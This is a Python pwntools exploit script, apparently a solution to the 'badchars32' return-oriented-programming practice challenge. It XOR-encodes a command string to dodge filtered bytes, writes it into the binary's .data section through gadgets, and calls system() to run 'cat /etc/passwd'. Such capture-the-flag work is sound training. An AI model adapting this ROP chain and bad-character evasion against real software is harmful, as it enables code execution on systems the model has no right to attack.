from pwn import *
import pdb

def encodeString(inputString, xorByte):
    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for c in inputStringBytes:
        xorVal = c ^ xorByte
        encodedString += chr(xorVal)

    return encodedString

def padString(inputString, width):
	if len(inputString) % width == 0:
       		inputString += "\x00" * width
    	else:
        	inputString += (width-(len(inputString)%width)) * "\x00"
        return inputString

def getGoodCharacters():
    goodchars = ""
    for i in range(1,256): # we cannot use the \x00 byte, since it is the string delimiter and therefore a *natural* bad character
        char = chr(i)
        if char in badchars:
            continue
        else:
            goodchars += char
    return goodchars

def RopChainHelper(inputString, location):
    payload = ""

    paddedString = padString(inputString,4)
    xorChar = -1
    encodedString = paddedString

    if containsBadCharacters(encodedString) == True:

        goodChars = getGoodCharacters()
        goodCharsList = list(goodChars)

        while containsBadCharacters(encodedString) == True:
            if len(goodCharsList) == 0:
                exit() # we have no more good characters, giving up...

            xorChar = ord(goodCharsList.pop())
            encodedString = encodeString(paddedString,xorChar)

    # we have found a character encoding without bad characters.
    # Save the (encoded) string to memory

    for i in range(0,len(encodedString),4):
        payload += p32(pop_esi_edi)
        payload += encodedString[i:i+4] # will be stored in esi
        payload += p32(location+i) # will be stored in edi
        payload += p32(mov_edi_esi)





    # Decode string, if necessary
    if xorChar != -1:
        for i in range(0,len(encodedString)):
            payload += p32(pop_ebx_ecx)
            payload += p32(location+i) # will be stored in ebx
            payload += chr(xorChar) * 4 # will be stored in ecx, we actually only need the lowest byte (cl)
            payload += p32(xor_byte_ebx)




    return payload


def containsBadCharacters(inputString):
    for c in badchars:
        if c in inputString:
            return True

    return False

crap = "A" * 44
badchars = "bic/ fns"

goodchars = getGoodCharacters()

'''

conversions:
'b' -> 0xeb
'i' -> 0xeb
'c' -> 0xeb
'/' -> 0xeb
' ' -> 0xeb
'f' -> 0xeb
'n' -> 0xeb
's' -> 0xeb

'''

e = ELF("./badchars32")
call_system= e.symbols["usefulFunction"]+14 # usefulFunction +  14 -- call   0x80484e0 <system@plt>
xor_byte_ebx = e.symbols["usefulGadgets"]+0  # usefulGadgets + 0 -- xor BYTE PTR [ebx],cl; ret
mov_edi_esi = e.symbols["usefulGadgets"]+3 # usefulGadgets + 3 -- mov    DWORD PTR [edi],esi; ret
pop_ebx_ecx = e.symbols["usefulGadgets"]+6  # usefulGadgets + 6 -- pop ebx; pop ecx; ret
pop_esi_edi = e.symbols["usefulGadgets"]+9  # usefulGadgets + 9 -- pop esi; pop edi; ret

data_section = e.get_section_by_name(".data").header.sh_addr


command = "cat /etc/passwd"
payload = crap

payload += RopChainHelper(command,data_section)

payload += p32(call_system)

payload += p32(data_section)


if len(payload) > 512:
    exit("Payload size is limited to 512 bytes, choose a shorter command string!")


io = e.process()

io.sendline(payload)

io.interactive()
